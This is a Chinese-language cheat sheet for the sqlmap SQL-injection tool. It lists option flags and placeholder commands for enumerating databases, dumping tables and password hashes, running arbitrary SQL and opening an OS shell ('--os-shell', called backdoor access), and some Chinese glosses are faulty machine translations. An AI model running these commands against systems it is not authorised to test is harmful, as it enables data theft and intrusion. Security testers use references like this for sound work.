# title{sqlmap - 一款sql注入的安全检测工具}
### 选项
```bash
-u  指定URL
-p  指定参数
-v  指定显示级别
--dbs  目标服务器中的数据库
--current-db  当前数据库
--tables  目标数据库有什么表
--columns  目标表中有什么列
--dump  获取数据
--batch  跳过问询（yes）之间执行，批处理，在检测过程中会问用户一些问题，使用这个参数统统使用默认值
--dbms  指定数据库类型
--current-user  查看当前用户
--users  查看所有用户
--passwords  数据库密码
--hostname  系统名称
--banner  数据库信息
--roles  数据库用户角色
```

### 常用命令
```bash
# Test URL and POST data and return database banner (if possible)
#测试URL和POST数据并返回数据库横幅（如果可能）
./sqlmap.py --url="<url>" --data="<post-data>" --banner

# Parse request data and test | request data can be obtained with burp
#解析请求数据和测试|请求数据可以通过打嗝获得
./sqlmap.py -r <request-file> <options>

# Fingerprint | much more information than banner
#指纹|比横幅更多的信息
./sqlmap.py -r <request-file> --fingerprint

# Get database username, name, and hostname
#获取数据库用户名，名称和主机名
./sqlmap.py -r <request-file> --current-user --current-db --hostname

# Check if user is a database admin
#检查用户是否是数据库管理员
./sqlmap.py -r <request-file> --is-dba

# Get database users and password hashes
#获取数据库用户和密码哈希值
./sqlmap.py -r <request-file> --users --passwords

# Enumerate databases
#枚举数据库
./sqlmap.py -r <request-file> --dbs

# List tables for one database
#列出一个数据库的表
./sqlmap.py -r <request-file> -D <db-name> --tables

# Other database commands
#其他数据库命令
./sqlmap.py -r <request-file> -D <db-name> --columns
                                           --schema
                                           --count
# Enumeration flags
#枚举标志
./sqlmap.py -r <request-file> -D <db-name>
                              -T <tbl-name>
                              -C <col-name>
                              -U <user-name>

# Extract data
#提取数据
./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump

# Execute SQL Query
#执行SQL查询
./sqlmap.py -r <request-file> --sql-query="<sql-query>"

# Append/Prepend SQL Queries
#附加/前置SQL查询
./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"

# Get backdoor access to sql server | can give shell access
#获取后门访问sql server |可以提供shell访问权限
./sqlmap.py -r <request-file> --os-shell
```

